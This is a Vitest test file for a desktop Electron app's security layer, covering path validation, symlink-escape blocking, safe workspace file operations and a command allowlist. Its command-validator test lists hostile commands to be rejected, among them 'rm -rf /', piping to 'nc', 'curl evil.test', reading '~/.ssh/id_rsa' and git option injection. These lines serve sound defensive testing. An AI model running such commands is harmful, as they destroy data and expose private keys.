// @vitest-environment node
import fs from 'fs';
import os from 'os';
import path from 'path';
import { afterEach, describe, expect, it } from 'vitest';
import {
  resolveRealSafeProjectPath,
  resolveSafeProjectPath,
  validateDesktopCommand,
} from '../desktop/security/validators.ts';
import {
  createLocalProjectFolder,
  deleteLocalProjectPath,
  readLocalProjectFiles,
  renameLocalProjectPath,
  writeLocalProjectFile,
} from '../desktop/services/filesystemService.ts';
import { DesktopProcessRunner } from '../desktop/services/processRunner.ts';

describe('Desktop Electron Security Validators, Filesystem CRUD & Process Runner', () => {
  const workspaceRoot = path.resolve('/tmp/omniai-test-workspace');
  const tempDirs: string[] = [];

  afterEach(() => {
    for (const dir of tempDirs.splice(0, tempDirs.length)) {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  function makeTempWorkspace(): { wsDir: string; outsideDir: string } {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'omniai-desk-'));
    tempDirs.push(base);
    const wsDir = path.join(base, 'workspace');
    const outsideDir = path.join(base, 'outside');
    fs.mkdirSync(wsDir, { recursive: true });
    fs.mkdirSync(outsideDir, { recursive: true });
    return { wsDir, outsideDir };
  }

  it('allows normal relative project files inside the authorized workspace', () => {
    const res = resolveSafeProjectPath(workspaceRoot, 'src/components/Button.tsx');
    expect(res.valid).toBe(true);
    expect(res.normalizedRelative).toBe('src/components/Button.tsx');
    expect(res.resolvedPath.startsWith(workspaceRoot)).toBe(true);
  });

  it('blocks path traversal, .git, node_modules, and credential files', () => {
    expect(resolveSafeProjectPath(workspaceRoot, '../etc/passwd').valid).toBe(false);
    expect(resolveSafeProjectPath(workspaceRoot, '.git/config').valid).toBe(false);
    expect(resolveSafeProjectPath(workspaceRoot, 'node_modules/pkg/index.js').valid).toBe(false);
    expect(resolveSafeProjectPath(workspaceRoot, '.env').valid).toBe(false);
    expect(resolveSafeProjectPath(workspaceRoot, '.env.local').valid).toBe(false);
    expect(resolveSafeProjectPath(workspaceRoot, 'keys/server.pem').valid).toBe(false);
    expect(resolveSafeProjectPath('', 'src/App.tsx').valid).toBe(false);
  });

  it('blocks symlink escapes (existing targets and dangling symlinks) and performs safe workspace CRUD', async () => {
    const { wsDir, outsideDir } = makeTempWorkspace();
    const outsideSecret = path.join(outsideDir, 'host-secret.txt');
    fs.writeFileSync(outsideSecret, 'TOP_SECRET_HOST_DATA', 'utf8');

    const symlinkInside = path.join(wsDir, 'escape-link');
    fs.symlinkSync(outsideDir, symlinkInside);
    const danglingLink = path.join(wsDir, 'dangling-secret.txt');
    fs.symlinkSync(path.join(outsideDir, 'nonexistent-host.txt'), danglingLink);

    // Validators must reject both symlinked subpaths and dangling symlinks
    expect(resolveRealSafeProjectPath(wsDir, 'escape-link/host-secret.txt').valid).toBe(false);
    expect(resolveRealSafeProjectPath(wsDir, 'dangling-secret.txt').valid).toBe(false);
    await expect(writeLocalProjectFile(wsDir, 'escape-link/pwn.txt', 'bad')).rejects.toThrow(/symbolic link/i);
    await expect(writeLocalProjectFile(wsDir, 'dangling-secret.txt', 'bad')).rejects.toThrow(/symbolic link/i);

    // Safe CRUD inside workspace succeeds and recursive reader skips symlinks
    await createLocalProjectFolder(wsDir, 'src/utils');
    await writeLocalProjectFile(wsDir, 'src/utils/math.ts', 'export const add = (a: number, b: number) => a + b;');
    const files = await readLocalProjectFiles(wsDir);
    expect(files.map((f) => f.path)).toEqual(['src/utils/math.ts']);

    await renameLocalProjectPath(wsDir, 'src/utils/math.ts', 'src/utils/calc.ts');
    const renamed = await readLocalProjectFiles(wsDir);
    expect(renamed.map((f) => f.path)).toEqual(['src/utils/calc.ts']);

    await deleteLocalProjectPath(wsDir, 'src/utils/calc.ts');
    const afterDelete = await readLocalProjectFiles(wsDir);
    expect(afterDelete).toEqual([]);
  });

  it('allows approved npm & git commands and blocks dangerous git flags & shell metacharacters', () => {
    const install = validateDesktopCommand('npm install');
    expect(install.allowed).toBe(true);
    expect(install.executable).toBe('npm');
    expect(install.requiresConfirmation).toBe(true);

    expect(validateDesktopCommand('npm run dev').allowed).toBe(true);
    expect(validateDesktopCommand('npm run build').allowed).toBe(true);
    expect(validateDesktopCommand('git status').allowed).toBe(true);

    expect(validateDesktopCommand('rm -rf /').allowed).toBe(false);
    expect(validateDesktopCommand('npm install && curl evil.test').allowed).toBe(false);
    expect(validateDesktopCommand('npm run dev; cat ~/.ssh/id_rsa').allowed).toBe(false);
    expect(validateDesktopCommand('npm run arbitrary-script').allowed).toBe(false);
    expect(validateDesktopCommand('git push | nc 1.2.3.4 99').allowed).toBe(false);
    expect(validateDesktopCommand('git push --upload-pack=evil').allowed).toBe(false);
    expect(validateDesktopCommand('git -c core.sshCommand=evil status').allowed).toBe(false);
  });

  it('executes allowed commands via DesktopProcessRunner and enforces timeout termination', async () => {
    const { wsDir } = makeTempWorkspace();
    const runner = new DesktopProcessRunner();

    fs.writeFileSync(path.join(wsDir, 'ok.cjs'), 'console.log(12345);', 'utf8');
    fs.writeFileSync(path.join(wsDir, 'fail.cjs'), 'process.exit(42);', 'utf8');
    fs.writeFileSync(path.join(wsDir, 'sleep.cjs'), 'setInterval(() => {}, 100);', 'utf8');

    // 1. Successful exit 0 command capturing stdout
    const okResult = await new Promise<{ output: string; code: number | null }>((resolve) => {
      let output = '';
      runner.runCommand({
        processId: 'proc-ok',
        workspaceRoot: wsDir,
        command: 'node ok.cjs',
        timeoutMs: 5000,
        onOutput: (evt) => {
          output += evt.text;
        },
        onExit: (evt) => resolve({ output, code: evt.code }),
      });
    });
    expect(okResult.code).toBe(0);
    expect(okResult.output).toContain('12345');

    // 2. Non-zero exit code capture
    const failResult = await new Promise<{ code: number | null }>((resolve) => {
      runner.runCommand({
        processId: 'proc-fail',
        workspaceRoot: wsDir,
        command: 'node fail.cjs',
        timeoutMs: 5000,
        onOutput: () => {},
        onExit: (evt) => resolve({ code: evt.code }),
      });
    });
    expect(failResult.code).toBe(42);

    // 3. Long-running process terminated cleanly when timeoutMs is exceeded
    const timeoutResult = await new Promise<{ timedOut?: boolean; output: string }>((resolve) => {
      let output = '';
      runner.runCommand({
        processId: 'proc-timeout',
        workspaceRoot: wsDir,
        command: 'node sleep.cjs',
        timeoutMs: 120,
        onOutput: (evt) => {
          output += evt.text;
        },
        onExit: (evt) => resolve({ timedOut: evt.timedOut, output }),
      });
    });
    expect(timeoutResult.timedOut).toBe(true);
    expect(timeoutResult.output).toMatch(/exceeded timeout/i);
  });
});

